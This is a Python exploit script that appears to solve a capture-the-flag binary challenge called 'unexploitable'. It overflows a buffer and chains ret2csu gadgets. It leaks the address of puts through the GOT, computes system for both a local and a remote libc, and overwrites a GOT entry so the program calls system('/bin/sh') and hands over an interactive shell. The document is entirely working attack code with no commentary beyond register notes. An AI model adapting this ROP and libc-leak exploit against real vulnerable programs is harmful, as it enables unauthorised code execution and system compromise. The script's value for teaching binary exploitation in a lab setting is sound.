from zio import *
#local
target = "./unexploitable"
#remote
target = "/home/unexploitable/unexploitable"
def get_io(target):
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, "green"), print_write = COLORED(RAW, "blue"))
	return io

def pwn(io):
	p_ret = l64(0x0000000000400512)
	pp_ret = l64(0x0000000000400511)
	add_esp_0x38_ret = l64(0x0000000000400614)

	puts_got = l64(0x0000000000601000)
	read_got = l64(0x0000000000601008)

	set_args_addr = l64(0x4005f6)
	#+ 0 no use 
	#+ 8 rbx 0
	#+10 rbp 1 ;rbx + 1 = rbp (will call set_args_addr again)
	#+18 r12 func_addr(got)
	#+20 r14 arg1
	#+28 r13 arg2
	#+30 r15 arg3
	
	call_func_addr = l64(0x4005e0)
	
	padding = 'a' * 16
	ebp = l64(0x01)

	shellcode = set_args_addr
	shellcode += l64(0x0) #no use
	shellcode += l64(0)	  #rbx 0
	shellcode += l64(1)	  #rbp 1
	shellcode += puts_got #func_addr
	shellcode += puts_got #arg1
	shellcode += puts_got #arg2 no use
	shellcode += puts_got #arg3 no use
	shellcode += call_func_addr

	#after call will call set_args_addr again
	shellcode += l64(0x0) #no use
	shellcode += l64(0)	  #rbx 0
	shellcode += l64(1)	  #rbp 1
	shellcode += read_got #func_addr
	shellcode += l64(0x0) #arg1 0
	shellcode += puts_got #arg2 buff
	shellcode += l64(0x10) #arg3 size
	shellcode += call_func_addr

	system_addr = puts_got
	binsh_addr = read_got

	#after call will call set_args_addr again
	shellcode += l64(0x0) #no use
	shellcode += l64(0)	  #rbx 0
	shellcode += l64(1)	  #rbp 1
	shellcode += system_addr #func_addr
	shellcode += binsh_addr #arg1 /bin/sh
	shellcode += binsh_addr #arg2 no use
	shellcode += binsh_addr #arg3 no use
	shellcode += call_func_addr


	payload = padding + ebp + shellcode
	io.read_until("Or.. maybe you can prove otherwise :)\n")
	io.gdb_hint()
	io.write(payload + "\n")
	data = io.read_until("\n").strip("\n")
	data = data[:8]
	print [c for c in data]
	puts_addr = l64(data.ljust(8, "\x00"))
	print "puts_addr:", hex(puts_addr)

	#local
	libc_offset = puts_addr - 0x000000000006fec0	
	system_addr = libc_offset + 0x0000000000044c40

	#remote 
	libc_offset = puts_addr - 0x0000000000070ce0	
	system_addr = libc_offset + 0x0000000000045660

	io.write(l64(system_addr) + "/bin/sh;" + "\n")

	io.interact()

io = get_io(target)
pwn(io)